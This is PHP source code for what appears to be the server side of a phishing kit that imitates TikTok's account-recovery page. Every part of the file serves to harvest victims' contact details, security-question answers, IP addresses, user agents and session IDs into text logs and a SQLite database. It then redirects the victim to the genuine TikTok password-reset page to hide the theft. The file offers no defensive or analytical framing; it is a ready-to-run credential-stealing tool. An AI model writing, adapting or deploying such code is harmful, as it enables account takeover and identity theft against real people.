<?php
session_start();

class TikTokRecoveryCapture {
    private $platformCode = 'TK';
    private $captureDir;
    private $dbFile;
    
    public function __construct() {
        $this->captureDir = '../../captures/' . $this->platformCode;
        if (!file_exists($this->captureDir)) {
            mkdir($this->captureDir, 0755, true);
        }
        $this->dbFile = $this->captureDir . '/' . $this->platformCode . '_recovery.db';
        $this->initializeDatabase();
    }
    
    private function initializeDatabase() {
        try {
            $db = new SQLite3($this->dbFile);
            $db->exec('CREATE TABLE IF NOT EXISTS recovery_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                contact TEXT,
                recovery_method TEXT,
                question_1 TEXT,
                question_2 TEXT,
                question_3 TEXT,
                ip_address TEXT,
                user_agent TEXT,
                session_id TEXT
            )');
            $db->close();
        } catch (Exception $e) {
            error_log("TikTok Recovery DB init failed: " . $e->getMessage());
        }
    }
    
    private function getClientIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        $headers = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR'];
        foreach ($headers as $header) {
            if (isset($_SERVER[$header])) {
                $ips = explode(',', $_SERVER[$header]);
                $ip = trim($ips[0]);
                break;
            }
        }
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
    }
    
    public function capture($data) {
        $ip = $this->getClientIP();
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $sessionId = session_id();
        
        $txtFile = $this->captureDir . '/RECOVERY_' . date('Ymd_His') . '.txt';
        $content = "═══════════════════════════════════════════════════════════\n";
        $content .= "[ TIKTOK RECOVERY DATA ] - " . date('Y-m-d H:i:s') . "\n";
        $content .= "═══════════════════════════════════════════════════════════\n";
        $content .= "CONTACT        : " . ($data['contact'] ?? 'N/A') . "\n";
        $content .= "RECOVERY TYPE  : " . ($data['recovery_type'] ?? 'N/A') . "\n";
        
        if (isset($data['question_1'])) {
            $content .= "\nSECURITY QUESTIONS:\n";
            $content .= "Q1 (Mascota)   : " . $data['question_1'] . "\n";
            $content .= "Q2 (Ciudad)    : " . $data['question_2'] . "\n";
            $content .= "Q3 (Comida)    : " . $data['question_3'] . "\n";
        }
        
        $content .= "\nIP ADDRESS     : " . $ip . "\n";
        $content .= "USER AGENT     : " . $userAgent . "\n";
        $content .= "SESSION ID     : " . $sessionId . "\n";
        $content .= "═══════════════════════════════════════════════════════════\n\n";
        
        file_put_contents($txtFile, $content, FILE_APPEND | LOCK_EX);
        
        try {
            $db = new SQLite3($this->dbFile);
            $stmt = $db->prepare('INSERT INTO recovery_data 
                (contact, recovery_method, question_1, question_2, question_3, ip_address, user_agent, session_id) 
                VALUES (:c, :m, :q1, :q2, :q3, :ip, :ua, :sid)');
            
            $stmt->bindValue(':c', $data['contact'] ?? '', SQLITE3_TEXT);
            $stmt->bindValue(':m', $data['recovery_type'] ?? '', SQLITE3_TEXT);
            $stmt->bindValue(':q1', $data['question_1'] ?? '', SQLITE3_TEXT);
            $stmt->bindValue(':q2', $data['question_2'] ?? '', SQLITE3_TEXT);
            $stmt->bindValue(':q3', $data['question_3'] ?? '', SQLITE3_TEXT);
            $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
            $stmt->bindValue(':ua', $userAgent, SQLITE3_TEXT);
            $stmt->bindValue(':sid', $sessionId, SQLITE3_TEXT);
            
            $stmt->execute();
            $db->close();
        } catch (Exception $e) {
            error_log("TikTok recovery save failed: " . $e->getMessage());
        }
        
        $summaryFile = $this->captureDir . '/RECOVERY_SUMMARY.txt';
        $summary = "✅ RECOVERY | " . ($data['contact'] ?? 'N/A') . " | " . date('Y-m-d H:i:s') . "\n";
        file_put_contents($summaryFile, $summary, FILE_APPEND);
    }
    
    public function redirect() {
        header('Location: https://www.tiktok.com/login/forgot-password');
        exit();
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $capture = new TikTokRecoveryCapture();
    $capture->capture($_POST);
    $capture->redirect();
} else {
    header('Location: recovery.html');
    exit();
}
?>